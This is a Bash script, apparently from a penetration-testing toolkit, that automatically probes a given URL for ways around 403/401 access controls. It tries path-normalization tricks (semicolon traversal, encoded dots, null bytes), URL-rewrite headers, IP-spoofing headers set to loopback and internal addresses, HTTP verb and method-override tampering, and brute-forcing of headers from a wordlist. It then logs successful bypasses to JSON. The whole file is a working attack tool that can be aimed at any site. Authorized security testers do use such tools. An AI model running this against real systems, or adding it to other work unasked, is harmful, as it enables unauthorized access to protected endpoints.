#!/bin/bash
# ==============================================================================
# 🚧 Automated HTTP 403/401 Forbidden & Reverse Proxy Access Control Bypass Prober
# Bash port of test_403_bypasses.ps1 — path normalizations, rewrite headers,
# IP spoofing, verb overrides, and optional extended header wordlist.
# ==============================================================================

TARGET_URL=""
BASELINE_STATUS=403
OUTPUT_JSON="recon/bypasses_403.json"
TIMEOUT_SEC=8
WORDLIST="payloads/headers/403_bypass_headers.txt"
EXTENDED=0

usage() {
    cat <<EOF
Usage: ./scripts/test_403_bypasses.sh -u <target_url> [options]

Options:
  -u <url>            Restricted URL to test (e.g. https://target.com/admin)
  -b <status>         Baseline expected status (default: 403)
  -o <file>           Output JSON path (default: recon/bypasses_403.json)
  -t <seconds>        Timeout per request (default: 8)
  -w <wordlist>       Extended header wordlist (default: payloads/headers/403_bypass_headers.txt)
  -x                  Extended header brute-force mode
  -h                  Show this help
Example:
  ./scripts/test_403_bypasses.sh -u "https://target.com/admin" -x
EOF
    exit 1
}

while getopts "u:b:o:t:w:xh" opt; do
    case $opt in
        u) TARGET_URL="$OPTARG" ;;
        b) BASELINE_STATUS="$OPTARG" ;;
        o) OUTPUT_JSON="$OPTARG" ;;
        t) TIMEOUT_SEC="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        x) EXTENDED=1 ;;
        h|*) usage ;;
    esac
done

[ -z "$TARGET_URL" ] && usage

CYAN='\033[0;36m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; RED='\033[0;31m'; MAGENTA='\033[0;35m'; NC='\033[0m'
echo -e "${CYAN}==========================================================${NC}"
echo -e "${YELLOW}   HTTP 403/401 Access Control Bypass Prober${NC}"
echo -e "   Target: $TARGET_URL"
echo -e "${CYAN}==========================================================${NC}"

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Extract scheme://authority, path, query
if [[ "$TARGET_URL" =~ ^(https?://)([^/]+)([^?]*)\??(.*)$ ]]; then
    BASE_DOMAIN="${BASH_REMATCH[1]}${BASH_REMATCH[2]}"
    PATH_PART="${BASH_REMATCH[3]}"
    QUERY_PART="${BASH_REMATCH[4]}"
else
    echo -e "${RED}[-] Invalid URL: $TARGET_URL${NC}"; exit 1
fi
[ -z "$PATH_PART" ] && PATH_PART="/"

ANOMALY_TMP=$(mktemp)
trap 'rm -f "$ANOMALY_TMP"' EXIT

anomaly_count=0

# test_payload <category> <name> <url> [method] [header] [value]
test_payload() {
    local category="$1" name="$2" url="$3" method="${4:-GET}" hkey="$5" hval="$6"
    local curl_args=(-sk --max-time "$TIMEOUT_SEC" -A "$UA" -X "$method" -o /dev/null -w "%{http_code} %{size_download}")
    [ -n "$hkey" ] && curl_args+=(-H "$hkey: $hval")
    local out
    out=$(curl "${curl_args[@]}" "$url" 2>/dev/null) || return
    local sc="${out%% *}" len="${out##* }"
    local len_diff=$(( len > BASE_LEN ? len - BASE_LEN : BASE_LEN - len ))
    if [ "$sc" != "$BASELINE_STATUS" ] || { [ "$len_diff" -gt 80 ] && [ "$sc" = "200" ]; }; then
        local color=$MAGENTA
        case "$sc" in 200|201|204) color=$GREEN ;; 301|302|307|308) color=$YELLOW ;; esac
        echo -e "${color}[!] [$category] $name -> Status: $sc (was $BASELINE_STATUS), Length: $len (diff: $len_diff)${NC}"
        jq -n -c --arg cat "$category" --arg name "$name" --arg url "$url" --arg method "$method" \
           --arg hkey "$hkey" --arg hval "$hval" --arg sc "$sc" --arg len "$len" --arg diff "$len_diff" \
           '{Category:$cat, Name:$name, Url:$url, Method:$method,
             Headers: (if $hkey != "" then {($hkey): $hval} else {} end),
             StatusCode: ($sc|tonumber), BodyLength: ($len|tonumber), LengthDiff: ($diff|tonumber)}' >> "$ANOMALY_TMP"
        anomaly_count=$((anomaly_count+1))
    fi
}

# --- Baseline ---
echo -e "${CYAN}[*] Establishing baseline response...${NC}"
BASE_OUT=$(curl -sk --max-time "$TIMEOUT_SEC" -A "$UA" -o /dev/null -w "%{http_code} %{size_download}" "$TARGET_URL") || {
    echo -e "${RED}[-] Failed to reach target${NC}"; exit 1
}
BASELINE_STATUS="${BASE_OUT%% *}"
BASE_LEN="${BASE_OUT##* }"
echo -e "${GREEN}[+] Baseline Status: $BASELINE_STATUS | Body Length: $BASE_LEN bytes${NC}"

# --- A. URL Path Manipulations ---
echo -e "\n${CYAN}[*] Testing URL Path Manipulations...${NC}"
path_test() { test_payload "Path-Manipulation" "$1" "$2"; }
path_test "Append Dot"                "$BASE_DOMAIN$PATH_PART."
path_test "Append Slash"              "$BASE_DOMAIN$PATH_PART/"
path_test "Double Slash Prefix"       "$BASE_DOMAIN//$PATH_PART"
path_test "Traversal DotSlash"        "$BASE_DOMAIN/.$PATH_PART"
path_test "URL Encoded Dot"           "$BASE_DOMAIN/%2e$PATH_PART"
path_test "Tomcat Matrix SemiColon"   "$BASE_DOMAIN$PATH_PART;"
path_test "Tomcat Traversal Semicolon" "$BASE_DOMAIN/anything/..;$PATH_PART"
path_test "Trailing Semicolon Parameter" "$BASE_DOMAIN$PATH_PART;param=1"
path_test "Append Space Encoded"      "$BASE_DOMAIN$PATH_PART%20"
path_test "Append Tab Encoded"        "$BASE_DOMAIN$PATH_PART%09"
path_test "Append Null Byte"          "$BASE_DOMAIN$PATH_PART%00"
path_test "Append .json Extension"    "$BASE_DOMAIN$PATH_PART.json"
path_test "Append Query Parameter"    "$BASE_DOMAIN$PATH_PART?anything"
path_test "Append Hash"               "$BASE_DOMAIN$PATH_PART#"
path_test "Uppercase Path"            "$BASE_DOMAIN$(echo "$PATH_PART" | tr '[:lower:]' '[:upper:]')"

# --- B. URL Rewrite Headers ---
echo -e "\n${CYAN}[*] Testing Request Rewriting Headers...${NC}"
for h in "X-Original-URL" "X-Rewrite-URL" "X-Override-URL" "X-Forwarded-Prefix" "Base-Url" "Request-Uri"; do
    test_payload "Header-Rewrite" "$h" "$BASE_DOMAIN/" "GET" "$h" "$PATH_PART"
done

# --- C. Client IP & Trust Spoofing ---
echo -e "\n${CYAN}[*] Testing IP & Network Spoofing Headers...${NC}"
IP_HEADERS=("X-Forwarded-For" "X-Real-IP" "True-Client-IP" "Client-IP" "X-Custom-IP-Authorization" \
            "Cluster-Client-IP" "X-Remote-IP" "X-Remote-Addr" "X-Client-IP" "X-Originating-IP")
for h in "${IP_HEADERS[@]}"; do
    test_payload "IP-Spoofing" "$h : 127.0.0.1"  "$TARGET_URL" "GET" "$h" "127.0.0.1"
    test_payload "IP-Spoofing" "$h : 10.0.0.1"   "$TARGET_URL" "GET" "$h" "10.0.0.1"
    test_payload "IP-Spoofing" "$h : 0x7f000001" "$TARGET_URL" "GET" "$h" "0x7f000001"
done

# --- D. HTTP Verb Overrides ---
echo -e "\n${CYAN}[*] Testing HTTP Verb & Method Overrides...${NC}"
for v in POST PUT DELETE TRACE OPTIONS HEAD; do
    test_payload "Method-Tampering" "HTTP Verb: $v" "$TARGET_URL" "$v"
done
for m in GET POST PUT PATCH HEAD; do
    test_payload "Method-Override-Header" "X-HTTP-Method-Override: $m" "$TARGET_URL" "GET" "X-HTTP-Method-Override" "$m"
    test_payload "Method-Override-Header" "X-Method-Override: $m"       "$TARGET_URL" "GET" "X-Method-Override" "$m"
done

# --- E. Protocol & Port Spoofing ---
echo -e "\n${CYAN}[*] Testing Protocol & Port Spoofing...${NC}"
test_payload "Protocol-Spoofing" "X-Forwarded-Port: 80"    "$TARGET_URL" "GET" "X-Forwarded-Port" "80"
test_payload "Protocol-Spoofing" "X-Forwarded-Port: 443"   "$TARGET_URL" "GET" "X-Forwarded-Port" "443"
test_payload "Protocol-Spoofing" "X-Forwarded-Proto: https" "$TARGET_URL" "GET" "X-Forwarded-Proto" "https"
test_payload "Protocol-Spoofing" "X-Forwarded-Scheme: https" "$TARGET_URL" "GET" "X-Forwarded-Scheme" "https"

# --- F. Extended Header Brute-force ---
if [ "$EXTENDED" = "1" ] && [ -f "$WORDLIST" ]; then
    echo -e "\n${CYAN}[*] Running Extended Wordlist Header Testing from $WORDLIST...${NC}"
    total=$(grep ":" < "$WORDLIST" 2>/dev/null | wc -l | tr -d ' ')
    count=0
    while IFS= read -r line; do
        case "$line" in *":"*) ;; *) continue ;; esac
        count=$((count+1))
        hk="${line%%:*}"
        hv="${line#*:}"
        hv="${hv#"${hv%%[![:space:]]*}"}"
        printf "\r[*] [%d/%d] Testing: %s: %s" "$count" "$total" "$hk" "$hv" >&2
        test_payload "Extended-Header" "$hk: $hv" "$TARGET_URL" "GET" "$hk" "$hv"
    done < "$WORDLIST"
    echo ""
fi

echo -e "\n${CYAN}==========================================================${NC}"
echo -e "${YELLOW}   Scan Complete! Total Anomalies/Bypasses Discovered: $anomaly_count${NC}"
echo -e "${CYAN}==========================================================${NC}"

if [ "$anomaly_count" -gt 0 ]; then
    out_dir=$(dirname "$OUTPUT_JSON")
    mkdir -p "$out_dir"
    # Wrap JSON lines into a JSON array (python3 if available, else jq)
    if command -v python3 >/dev/null 2>&1; then
        cat "$ANOMALY_TMP" | python3 -c 'import json,sys; print(json.dumps([json.loads(l) for l in sys.stdin if l.strip()], indent=2))' \
            > "$OUTPUT_JSON"
    else
        echo "[" > "$OUTPUT_JSON"
        paste -sd, "$ANOMALY_TMP" | sed 's/,/,\n/g' >> "$OUTPUT_JSON"
        echo "]" >> "$OUTPUT_JSON"
    fi
    echo -e "${GREEN}[+] Bypasses saved to: $OUTPUT_JSON${NC}"
fi
